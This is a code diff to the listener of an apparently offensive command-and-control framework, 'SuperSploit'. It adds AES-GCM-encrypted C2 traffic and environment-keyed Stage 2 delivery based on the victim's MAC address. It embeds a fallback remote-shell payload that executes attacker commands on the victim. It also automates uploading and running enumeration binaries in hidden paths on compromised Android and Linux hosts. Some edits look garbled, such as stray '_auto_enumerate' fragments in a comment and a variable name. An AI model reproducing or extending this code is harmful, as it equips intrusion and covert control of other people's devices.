@@ -12,6 +12,8 @@ import zlib
 import shutil
 import glob
 import datetime
+import hashlib
+import secrets
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 from prompt_toolkit import PromptSession
@@ -32,34 +34,120 @@ class Listener:
     active_sessions = {}
     session_counter = 1
     rpc_server_started = False
+    
+    # Get database instance first
+    db = DatabaseManagment.get()
+    enc_type = db.get("ENC_TYPE", "XOR")  # SetV auto-uppercases variable names
+    aes_key = None
+    session_id = db.get("SESSION_ID", "")  # Session ID for AD binding
+    
+    # Decode and validate AES key if in AES256 mode
+    if enc_type == "AES256":
+        write(f"[*] AES-256-GCM mode enabled")
+        write(f"[*] SESSION_ID: {session_id}")
+        try:
+            encoded_key = db.get("AES_KEY", "")
+            if encoded_key:
+                # Key should be base64 encoded; decode it back to bytes
+                import base64 as b64_module
+                aes_key = b64_module.b64decode(encoded_key.encode('ascii') if isinstance(encoded_key, str) else encoded_key)
+                # Validate key is 32 bytes (256-bit)
+                if len(aes_key) != 32:
+                    write(f"[-] WARNING: AES_KEY is {len(aes_key)} bytes, expected 32 bytes. Key may be corrupted.")
+                    aes_key = None
+                else:
+                    write(f"[+] AES-256 key loaded and validated (32 bytes)")
+        except Exception as e:
+            write(f"[-] ERROR decoding AES_KEY: {e}")
+            aes_key = None
 
-    @staticmethod
-    def send_enc(sock, data):
+    @classmethod
+    def send_enc(cls, sock, data, key_override=None):
         import struct, base64
-        key = DatabaseManagment.get().get("XOR_KEY", "SuperSploitKey")
-        if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
-        enc = base64.b64encode(bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)]))
-        sock.sendall(struct.pack('>I', len(enc)) + enc)
+        if cls.enc_type == "AES256":
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            if isinstance(data, str):
+                data = data.encode('utf-8', errors='ignore')
+            nonce = os.urandom(12)  # 96-bit nonce for AES-GCM (12 bytes)
+            key = key_override or cls.aes_key
+            if not key:
+                write("[-] ERROR: AES key not available for encryption")
+                return
+            try:
+                aesgcm = AESGCM(key)
+                # Use SESSION_ID as associated data to bind encryption to this session
+                # Ensure session_id is a string before encoding (defensive against type conversion issues)
+                session_id_str = str(cls.session_id) if cls.session_id else ""
+                ad = session_id_str.encode('utf-8') if session_id_str else None
+                enc = aesgcm.encrypt(nonce, data, ad)
+                enc = base64.b64encode(nonce + enc)
+                sock.sendall(struct.pack('>I', len(enc)) + enc)
+                write(f"[+] AES-256-GCM: Sent {len(data)} bytes (nonce + ciphertext = {len(enc)} bytes encoded) | SESSION_ID binding: {cls.session_id}")
+            except Exception as e:
+                write(f"[-] AES encryption failed: {e}")
+            return
+        else:
+            key = key_override or DatabaseManagment.get().get("XOR_KEY", "SuperSploitKey")
+            if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
+            enc = base64.b64encode(bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)]))
+            sock.sendall(struct.pack('>I', len(enc)) + enc)
 
-    @staticmethod
-    def recv_enc(sock):
+    @classmethod
+    def recv_enc(cls, sock, key_override=None):
         import struct, base64
-        key = DatabaseManagment.get().get("XOR_KEY", "SuperSploitKey")
-        def _r(n):
-            d = bytearray()
-            while len(d) < n:
-                p = sock.recv(n - len(d))
-                if not p: return None
-                d.extend(p)
-            return bytes(d)
-        raw_l = _r(4)
-        if not raw_l: return None
-        l = struct.unpack('>I', raw_l)[0]
-        if l == 0: return b"" # Heartbeat frame
-        enc = _r(l)
-        if not enc: return None
-        dec = base64.b64decode(enc)
-        return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(dec)])
+        if cls.enc_type == "AES256":
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            key = key_override or cls.aes_key
+            if not key:
+                write("[-] ERROR: AES key not available for decryption")
+                return None
+            def _r(n):
+                d = bytearray()
+                while len(d) < n:
+                    p = sock.recv(n - len(d))
+                    if not p: return None
+                    d.extend(p)
+                return bytes(d)
+            raw_l = _r(4)
+            if not raw_l: return None
+            l = struct.unpack('>I', raw_l)[0]
+            if l == 0:
+                write(f"[*] AES-256-GCM: Heartbeat received")
+                return b"" # Heartbeat frame
+            enc = _r(l)
+            if not enc: return None
+            try:
+                dec = base64.b64decode(enc)
+                nonce = dec[:12]
+                ciphertext = dec[12:]
+                aesgcm = AESGCM(key)
+                # Use SESSION_ID as associated data to verify this session context
+                # Ensure session_id is a string before encoding (defensive against type conversion issues)
+                session_id_str = str(cls.session_id) if cls.session_id else ""
+                ad = session_id_str.encode('utf-8') if session_id_str else None
+                plaintext = aesgcm.decrypt(nonce, ciphertext, ad)
+                write(f"[+] AES-256-GCM: Received and decrypted {len(plaintext)} bytes | SESSION_ID verified: {cls.session_id}")
+                return plaintext
+            except Exception as e:
+                write(f"[-] AES decryption failed: {e}")
+                return None
+        else:
+            key = key_override or DatabaseManagment.get().get("XOR_KEY", "SuperSploitKey")
+            def _r(n):
+                d = bytearray()
+                while len(d) < n:
+                    p = sock.recv(n - len(d))
+                    if not p: return None
+                    d.extend(p)
+                return bytes(d)
+            raw_l = _r(4)
+            if not raw_l: return None
+            l = struct.unpack('>I', raw_l)[0]
+            if l == 0: return b"" # Heartbeat frame
+            enc = _r(l)
+            if not enc: return None
+            dec = base64.b64decode(enc)
+            return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(dec)])
 
     @classmethod
     def start(cls, database, deploy_stage2=False):
@@ -71,8 +159,7 @@ class Listener:
         if cls.active_listener_socket:
             write("[*] Terminating previous background listener to free the port...")
             old_socket = cls.active_listener_socket
-            cls.active_listener_socket = None  # Signal the background thread to stop
-            
+            cls.active_listener_socket = None  # Signal the background thread to stop_auto_enumerate
             try:
                 # Forcibly break the blocking accept() call immediately
                 old_socket.shutdown(socket.SHUT_RDWR)
@@ -127,9 +214,9 @@ class Listener:
                             try:
                                 cls.send_enc(sock, cmd)
                                 sock.settimeout(15.0)
-                                resp = cls.recv_enc(sock)
+                                _auto_enumerateresp = cls.recv_enc(sock)
                                 sock.settimeout(None)
-                                out = resp.decode('utf-8', errors='ignore') if resp else ""
+                                out = _auto_enumerateresp.decode('utf-8', errors='ignore') if _auto_enumerateresp else ""
                                 self.send_response(200)
                                 self.send_header('Content-type', 'application/json')
                                 self.end_headers()
@@ -205,11 +292,10 @@ class Listener:
 
         def handle_client(raw_client, addr, deploy_stage2_flag, stage2_code, context):
             try:
+                
                 # Trace Redirection for Remote Debugging
                 def trace(msg):
-                    log_file = os.path.join(installation, ".data", ".logs", "LISTENER_TRACE.log")
-                    os.makedirs(os.path.dirname(log_file), exist_ok=True)
-                    with open(log_file, "a") as tf:
+                    with open("/home/donald/LISTENER_TRACE.log", "a") as tf:
                         tf.write(f"[{datetime.datetime.now()}] {msg}\n")
                     write(msg)
 
@@ -218,6 +304,20 @@ class Listener:
                 
                 db = DatabaseManagment.get()
                 active_xor = db.get("XOR_KEY", "SuperSploitKey")
+                
+                # Reload encryption configuration for this connection (may have changed since listener started)
+                connection_enc_type = db.get("ENC_TYPE", "XOR")
+                connection_session_id = str(db.get("SESSION_ID", ""))  # Ensure it's always a string
+                connection_aes_key = None
+                if connection_enc_type == "AES256":
+                    try:
+                        encoded_key = db.get("AES_KEY", "")
+                        if encoded_key:
+                            import base64 as b64_module
+                            connection_aes_key = b64_module.b64decode(encoded_key.encode('ascii') if isinstance(encoded_key, str) else encoded_key)
+                    except Exception:
+                        pass
+                
                 trace(f"[*] New connection from {addr[0]}:{addr[1]} (XOR_KEY: {active_xor})")
 
                 # Peek at the first byte to determine if it's a TLS handshake
@@ -240,68 +340,62 @@ class Listener:
                     client = raw_client
                     trace(f"[+] Unencrypted TCP connection established from {addr[0]}:{addr[1]}")
 
+                # Update class-level encryption settings to match this connection
+                cls.enc_type = connection_enc_type
+                cls.session_id = connection_session_id
+                if connection_aes_key:
+                    cls.aes_key = connection_aes_key
 
                 if deploy_stage2_flag and first_byte == b'\x16':
                     write("[*] Connection caught! Packaging and encrypting Stage 2 in-memory C2...")
                     
                     try:
-                        # Dynamically weaponize the Stage 2 code with active framework variables
-                        from .stager_generator import StagerGenerator
-                        import tempfile
-                        
-                        # We use the current session's host/port for the beacon callback
-                        # unless explicitly overridden in the database
-                        lhost = database.get("LHOST", database.get("L_HOST", "127.0.0.1"))
-                        lport = database.get("LPORT", database.get("L_PORT", "5000"))
-                        xor_key = database.get("XOR_KEY", "SuperSploitKey")
-                        stage2url = database.get("STAGE2URL", database.get("STAGE2_URL", f"http://{lhost}:8000"))
+                        # --- Environment-Keyed Handshake ---
+                        client.send("GET_MAC_ADDRESS".encode())
+                        mac_address = client.recv(1024).decode().strip()
+                        write(f"[*] Received MAC address from agent: {mac_address}")
+                        stage_key_flag = db.get("STAGE_KEY_FLAG")
+                        if not stage_key_flag:
+                            stage_key_flag = secrets.token_hex(16)
+                            db["STAGE_KEY_FLAG"] = stage_key_flag
+                            write(f"[*] No STAGE_KEY_FLAG found. Generated and saved a new random flag for this session: {stage_key_flag}\n")
+                            
 
-                        # Ensure we have a string representation for the generator
-                        stage2code_str = stage2_code.decode('utf-8', errors='ignore') if isinstance(stage2_code, bytes) else stage2_code
-
-                        # Re-process the code through the generator to inject variables
-                        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
-                            tmp.write(stage2code_str)
-                            temp_path = tmp.name
+                        composite_salt = f"{mac_address}:{stage_key_flag}".encode()
+                        master_c2_key = db.get("MASTER_C2_KEY", "default_master_key").encode()
+                        derived_key = hashlib.pbkdf2_hmac('sha256', master_c2_key, composite_salt, 100000)
                         
-                        generator = StagerGenerator(temp_path)
-                        weaponized_code = generator.get_raw_payload(
-                            lhost=lhost,
-                            lport=lport,
-                            xor_key=xor_key,
-                            stage2url=stage2url,
-                            obfuscate=False
-                        )
-                        if os.path.exists(temp_path):
-                            os.remove(temp_path)
-                        
-                        # Use the weaponized code for delivery
-                        payload_to_send = weaponized_code.encode()
+                        # The Stage 2 code is sent raw, as the Stage 1 stager already sets up the execution environment.
+                        # No further variable injection or obfuscation is needed here.
+                        payload_to_send = stage2_code
 
                         # 1. Zlib compress the payload
                         payload_data = zlib.compress(payload_to_send)
                     except Exception as e:
-                        write(f"[!] Warning: Failed to dynamically weaponize Stage 2: {e}")
+                        write(f"[!] Warning: Failed to prepare Stage 2: {e}")
                         # Fallback to original code
                         try:
                             payload_data = zlib.compress(stage2_code)
                         except Exception:
                             payload_data = stage2_code
 
-                    # 2. XOR encrypt the payload to match stager decryption
-                    xor_key = database.get("XOR_KEY", "SuperSploitKey")
-                    encrypted_payload = bytes([b ^ ord(xor_key[i % len(xor_key)]) for i, b in enumerate(payload_data)])
-
-                    # 3. Base64 encode the final result
-                    encoded_stage2 = base64.b64encode(encrypted_payload)
-                    
-                    # 4. Prepend Framework Magic Bytes for stager validation
+                    # 2. Prepend Framework Magic Bytes for stager validation (before encryption)
                     magic = b"\x53\x53" # 'SS'
-                    final_blob = magic + encoded_stage2
-
-                    length_header = struct.pack('>I', len(final_blob))
-                    client.sendall(length_header + final_blob)
+                    final_payload = magic + payload_data
+                    
+                    # 3. Send with cls.send_enc() which handles both XOR and AES-256-GCM automatically
+                    cls.send_enc(client, final_payload)
                     write(f"[*] Stage 2 payload sent over TLS to {addr[0]}:{addr[1]}.")
+
+                    client.settimeout(5.0)
+                    try:
+                        ready = cls.recv_enc(client)
+                    finally:
+                        client.settimeout(None)
+                    if ready != b"__SS_STAGE2_READY__\n":
+                        write(f"[-] Stage 2 agent did not become ready from {addr[0]}:{addr[1]}.")
+                        client.close()
+                        return
 
                 # Register the active session
                 session_id = cls.session_counter
@@ -313,24 +407,28 @@ class Listener:
                 
                 write(f"[+] Background Session {session_id} opened! Type 'sessions -i {session_id}' to interact.\n")
                 
-                # Fetch the initialization banner
-                client.settimeout(5.0)
-                try:
-                    banner_raw = cls.recv_enc(client)
-                    if banner_raw:
-                        banner = banner_raw.decode('utf-8', errors='ignore').strip()
-                        write(f"[Session {session_id}]: {banner}\n")
-                except socket.timeout:
-                    pass
-                client.settimeout(None)
+                # Staged agents begin with command frames and do not send a banner.
+                # Reading here would consume the first command or leave the TLS
+                # stream in a failed timeout state before interactive mode starts.
+                if not deploy_stage2_flag:
+                    client.settimeout(5.0)
+                    try:
+                        banner_raw = cls.recv_enc(client)
+                        if banner_raw:
+                            banner = banner_raw.decode('utf-8', errors='ignore').strip()
+                            write(f"[Session {session_id}]: {banner}\n")
+                    except socket.timeout:
+                        pass
+                    finally:
+                        client.settimeout(None)
 
-                # Trigger automated enumeration in the background (Pro Feature)
-                if str(database.get("AUTO_ENUM", "true")).lower() == "true":
+                # Trigger automated enumeration in the background
+                if str(database.get("AUTO_ENUM", "false")).lower() == "true":
                     from .license_manager import LicenseManager
                     if LicenseManager.check_pro_status():
                         threading.Thread(target=cls._auto_enumerate, args=(client, addr, session_id, database), daemon=True).start()
                     else:
-                        write("[*] Skipping Automated Enumeration (SuperSploit Pro feature).\n")
+                        write("[*] Skipping Automated Enumeration.\n")
 
             except Exception as e:
                 import traceback
@@ -353,12 +451,10 @@ class Listener:
                         "-out", cert_path, "-days", "365", "-nodes", "-subj", "/CN=supersploit.c2"
                     ], check=True, capture_output=True)
 
-                context = ssl.SSLContext(ssl.PROTOCOL_TLS) # Use PROTOCOL_TLS for maximum compatibility
-                context.options |= ssl.OP_NO_SSLv2
-                context.options |= ssl.OP_NO_SSLv3
-                # Explicitly allow TLS 1.0+ to support older Android versions if necessary
-                context.minimum_version = ssl.TLSVersion.TLSv1
-                context.set_ciphers('DEFAULT@SECLEVEL=1') # Lower security level slightly for compatibility
+                # Use the modern, explicit PROTOCOL_TLS_SERVER for robust negotiation
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                context.minimum_version = ssl.TLSVersion.TLSv1_2 # Enforce modern TLS
+                context.set_ciphers('DEFAULT@SECLEVEL=1')
                 context.load_cert_chain(certfile=cert_path, keyfile=key_path)
 
                 # Create a raw TCP socket listener
@@ -402,6 +498,13 @@ class Listener:
                 server.listen(5)
                 server.settimeout(0.5)  # Unblock accept() every 0.5s to check for termination signals
                 write(f"\n[*] SSL/TLS background listener active on {host}:{port}. Waiting for connections...")
+                # Log encryption configuration
+                if cls.enc_type == "AES256" and cls.aes_key:
+                    write(f"[+] Encryption: AES-256-GCM enabled")
+                    write(f"    - SESSION_ID (AD): {cls.session_id}")
+                    write(f"    - Key Size: {len(cls.aes_key)} bytes (256-bit)")
+                else:
+                    write(f"[*] Encryption: XOR (legacy)")
 
                 # Pre-load Stage 2 code to avoid disk I/O on every connection
                 stage2_code = b""
@@ -411,8 +514,70 @@ class Listener:
                         with open(stage_two_path, "rb") as file:
                             stage2_code = file.read()
                     else:
-                        write(f"[!] STAGE_TWO not set or missing. Falling back to default Stage 2 shell...")
-                        stage2_code = b"def _():\n global client_socket\n _o=__import__('os')\n _s=__import__('subprocess')\n while 1:\n  try:\n   c=client_socket.recv(4096).decode('utf-8',errors='ignore').strip()\n   if not c:continue\n   if c=='exit':break\n   p=_s.run(c,shell=True,capture_output=True,text=True)\n   client_socket.send((p.stdout+p.stderr+'\\n').encode())\n  except:break\n_()"
+                        # Older database entries may point at a payload that was renamed or moved.
+                        candidate_path = os.path.join(
+                            DatabaseManagment.getInstall(),
+                            "payloads",
+                            "Stage2",
+                            "dynamic-reverse-shell.py",
+                        )
+                        if os.path.exists(candidate_path):
+                            with open(candidate_path, "rb") as file:
+                                stage2_code = file.read()
+                            write(f"[*] Configured Stage 2 not found; using {candidate_path}")
+                        else:
+                            write(f"[!] STAGE_TWO not set or missing. Falling back to default Stage 2 shell...")
+                            stage2_code = b"""
+import base64
+import struct
+import subprocess
+
+def _send(data):
+    if isinstance(data, str):
+        data = data.encode("utf-8", errors="ignore")
+    encoded = base64.b64encode(bytes(
+        value ^ ord(XOR_KEY[index % len(XOR_KEY)])
+        for index, value in enumerate(data)
+    ))
+    client_socket.sendall(struct.pack(">I", len(encoded)) + encoded)
+
+def _recv():
+    def _read(size):
+        data = bytearray()
+        while len(data) < size:
+            chunk = client_socket.recv(size - len(data))
+            if not chunk:
+                return None
+            data.extend(chunk)
+        return bytes(data)
+
+    header = _read(4)
+    if not header:
+        return None
+    size = struct.unpack(">I", header)[0]
+    if size == 0:
+        return b""
+    encoded = _read(size)
+    if not encoded:
+        return None
+    decoded = base64.b64decode(encoded)
+    return bytes(
+        value ^ ord(XOR_KEY[index % len(XOR_KEY)])
+        for index, value in enumerate(decoded)
+    )
+
+while True:
+    command = _recv()
+    if command is None:
+        break
+    command = command.decode("utf-8", errors="ignore").strip()
+    if command == "exit":
+        break
+    if not command:
+        continue
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    _send(result.stdout + result.stderr + "\\n")
+"""
 
                 def heartbeat_monitor(bound_server):
                     """Background thread to purge dead sessions using a 1-byte ping."""
@@ -504,76 +669,106 @@ class Listener:
         """Automatically runs enumeration tools on a new session and updates the target profile."""
         try:
             # Short delay to allow session to settle
-            time.sleep(3)
+            time.sleep(1)
             
-            # 1. Identify if it's Android
-            cls.send_enc(client, b"getprop ro.product.model")
-            model_raw = cls.recv_enc(client)
-            if not model_raw or model_raw.strip() == b"":
-                return # Not Android or unresponsive
-            
-            model = model_raw.decode('utf-8', errors='ignore').strip()
-            write(f"[*] Session {session_id}: Detected Android device ({model}). Starting auto-enum...\n")
-            
+            # 1. Identify OS Family
+            cls.send_enc(client, b"if [ -d /data/local/tmp ]; then echo 'android'; else uname -s; fi")
+            os_family_raw = cls.recv_enc(client)
+            os_family = os_family_raw.decode('utf-8', errors='ignore').strip().lower()
+
+            if not os_family:
+                write(f"[-] Session {session_id}: Could not determine OS family.\n")
+                return
+
+            write(f"[*] Session {session_id}: Detected OS family: {os_family}. Starting auto-enum...\n")
+
             # 2. Identify Architecture
             cls.send_enc(client, b"uname -m")
             arch_raw = cls.recv_enc(client)
-            arch = arch_raw.decode('utf-8', errors='ignore').strip() if arch_raw else "aarch64"
+            arch = arch_raw.decode('utf-8', errors='ignore').strip() if arch_raw else "unknown"
             
-            # Sync the framework's global database to the true device architecture
+            # Sync the framework's global database
             database.set("ARCH", arch)
             if int(session_id) in cls.active_sessions:
                 cls.active_sessions[int(session_id)]["arch"] = arch
-                cls.active_sessions[int(session_id)]["os_family"] = "Android"
+                cls.active_sessions[int(session_id)]["os_family"] = os_family
 
-            # 3. Compile or find enumeration tool
+            # 3. Select and Compile Enumeration Tool
             install = DatabaseManagment.getInstall()
-            tool_source = os.path.join(install, "source", "tools", "android-enum3.c")
+            tool_source = None
+            out_file = None
+            remote_path = None
+            compiler_flags = ["-pthread", "-O2"]
             
-            comp_arch = "android_arm64" if "64" in arch else "android_v7"
-            out_file = os.path.join(install, ".data", ".cache", f"android-enum3_{comp_arch}")
+            if "android" in os_family:
+                tool_source = os.path.join(install, "source", "android_enum", "android-enum3.c")
+                comp_arch = "android_arm64" if "64" in arch else "android_v7"
+                out_file = os.path.join(install, ".data", ".cache", f"android-enum3_{comp_arch}")
+                remote_path = f"/data/local/tmp/.ss_enum_{random.randint(1000, 9999)}"
+            elif "linux" in os_family:
+                tool_source = os.path.join(install, "source", "linux_enum", "linux_enum.c")
+                out_file = os.path.join(install, ".data", ".cache", f"linux-enum_{arch}")
+                remote_path = f"/tmp/.ss_enum_{random.randint(1000, 9999)}"
+            elif "darwin" in os_family:
+                write(f"[*] Session {session_id}: macOS (Darwin) detected. Auto-enumeration is not yet supported for this OS.\n")
+                return
+            else: # Includes Windows, etc.
+                write(f"[*] Session {session_id}: OS '{os_family}' is not supported for automated C-based enumeration.\n")
+                return
+
+            if not os.path.exists(tool_source):
+                write(f"[-] Session {session_id}: Enumeration tool source not found at {tool_source}.\n")
+                return
+
             os.makedirs(os.path.dirname(out_file), exist_ok=True)
             
             if not os.path.exists(out_file):
-                # Attempt to compile
-                write(f"[*] Session {session_id}: Compiling enumeration tool for {comp_arch}...")
+                write(f"[*] Session {session_id}: Compiling enumeration tool for {os_family} ({arch})...")
                 compiler = "gcc" # Fallback
                 found_compiler = False
-                buildozer_root = os.path.expanduser("~/.buildozer")
-                if os.path.exists(buildozer_root):
-                    pattern = ""
-                    if comp_arch == "android_arm64":
-                        pattern = os.path.join(buildozer_root, "android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android*-clang")
-                    else:
-                        pattern = os.path.join(buildozer_root, "android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/armv7a-linux-androideabi*-clang")
-                    
-                    matches = glob.glob(pattern)
-                    if matches:
-                        compiler = sorted(matches, reverse=True)[0]
-                        found_compiler = True
+
+                if "android" in os_family:
+                    buildozer_root = os.path.expanduser("~/.buildozer")
+                    if os.path.exists(buildozer_root):
+                        pattern = ""
+                        if "64" in arch:
+                            pattern = os.path.join(buildozer_root, "android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android*-clang")
+                        else:
+                            pattern = os.path.join(buildozer_root, "android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/armv7a-linux-androideabi*-clang")
+                        
+                        matches = glob.glob(pattern)
+                        if matches:
+                            compiler = sorted(matches, reverse=True)[0]
+                            found_compiler = True
                 
+                # Generic cross-compiler check for Linux/other targets
                 if not found_compiler:
-                    sys_compiler = "aarch64-linux-gnu-gcc" if comp_arch == "android_arm64" else "arm-linux-gnueabi-gcc"
-                    if shutil.which(sys_compiler):
+                    sys_compiler_map = {
+                        "aarch64": "aarch64-linux-gnu-gcc",
+                        "armv7l": "arm-linux-gnueabi-gcc",
+                        "x86_64": "gcc" # Assume host compiler is sufficient
+                    }
+                    sys_compiler = sys_compiler_map.get(arch)
+                    if sys_compiler and shutil.which(sys_compiler):
                         compiler = sys_compiler
                         found_compiler = True
                 
                 if found_compiler:
-                    proc = subprocess.run([compiler, tool_source, "-o", out_file, "-pthread", "-O2"], capture_output=True)
+                    proc = subprocess.run([compiler, tool_source, "-o", out_file] + compiler_flags, capture_output=True)
                     if proc.returncode != 0:
-                        write(f"[-] Session {session_id}: Compilation failed.\n")
+                        write(f"[-] Session {session_id}: Compilation failed: {proc.stderr.decode('utf-8', 'ignore')}\n")
                         return
                 else:
-                    write(f"[-] Session {session_id}: No cross-compiler found. Skipping C-based enum.\n")
+                    write(f"[-] Session {session_id}: No suitable cross-compiler found for {arch}. Skipping C-based enum.\n")
                     return
 
             # 4. Upload and Execute
-            remote_path = f"/data/local/tmp/.ss_enum_{random.randint(1000, 9999)}"
             with open(out_file, 'rb') as f:
                 file_data = f.read()
             
             cls.send_enc(client, f"upload {remote_path}")
             resp = cls.recv_enc(client)
+
             if resp and b"READY" in resp:
                 cls.send_enc(client, file_data)
                 cls.recv_enc(client) # Skip upload success message
@@ -587,16 +782,24 @@ class Listener:
                     # 5. Process Report and Update Profile
                     ip = addr[0]
                     profile = DatabaseManagment.importFromTargets(ip)
+                    
+                    # Determine a name for the profile
+                    model = ""
+                    if "android" in os_family:
+                        cls.send_enc(client, b"getprop ro.product.model")
+                        model_raw = cls.recv_enc(client)
+                        model = model_raw.decode('utf-8', errors='ignore').strip()
+
                     if not profile:
                         profile = {"name": model or ip, "ip": ip, "research": []}
                     
                     # Bind the true device architecture and OS to the target profiles
-                    profile["os_family"] = "Android"
+                    profile["os_family"] = os_family
                     profile["architecture"] = arch
                     
                     targets = DatabaseManagment.getTargets()
                     if ip not in targets: targets[ip] = {}
-                    targets[ip]["os_family"] = "Android"
+                    targets[ip]["os_family"] = os_family
                     targets[ip]["architecture"] = arch
 
                     key_points = []
